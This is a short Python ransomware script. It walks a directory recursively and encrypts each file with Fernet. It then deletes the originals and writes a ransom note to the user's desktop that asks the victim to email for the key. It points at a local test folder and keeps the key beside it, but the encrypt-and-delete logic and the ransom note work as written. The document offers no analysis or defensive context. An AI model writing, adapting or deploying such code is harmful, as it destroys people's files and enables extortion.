import os
from cryptography.fernet import Fernet

# Function to generate an encryption key
def generate_key():
    return Fernet.generate_key()
# Function to save the encryption key to a file
def save_key(key, key_file_path):
    with open(key_file_path, 'wb') as key_file:
        key_file.write(key)

# Function to encrypt a single file
def encrypt_file(file_path, cipher_suite):
    with open(file_path, 'rb') as file:
        original_file_data = file.read()
    encrypted_data = cipher_suite.encrypt(original_file_data)

    # Write the encrypted data to a new file with the same name plus '.encrypted'
    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)

# Function to encrypt all files in a directory recursively
def encrypt_directory(directory_path, cipher_suite):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            # Skip already encrypted files
            if not file.endswith('.encrypted'):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, cipher_suite)

# Function to save encryption information to a file on the desktop
def save_encryption_info(desktop_path, info_message):
    info_file_path = os.path.join(desktop_path, "encryption_info.txt")
    with open(info_file_path, 'w') as info_file:
        info_file.write(info_message)

# Main function that orchestrates the encryption process
def main():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    project_path = os.getcwd()
    key_file_path = os.path.join(project_path, "encryption_key.key")
    encryption_info_message = "All of your files have been encrypted!\nTo unlock them contact me with your encryption code in this email@email.com"
    
    # Generate and save the key if it does not exist yet
    if not os.path.exists(key_file_path):
        key = generate_key()
        save_key(key, key_file_path)
        print("Encryption key generated and saved.")
    else:
        # Load the existing key
        with open(key_file_path, 'rb') as key_file:
            key = key_file.read()
        print("Existing encryption key loaded.")

    # Create a cipher suite with the key
    cipher_suite = Fernet(key)
    # Define the directory to be encrypted
    directory_to_encrypt = './testfolder'
    encrypt_directory(directory_to_encrypt, cipher_suite)
    
    # Save the encryption information on the user's desktop
    save_encryption_info(desktop_path, encryption_info_message)
    print("Encryption completed. Check your desktop for contact information.")

if __name__ == "__main__":
    main()
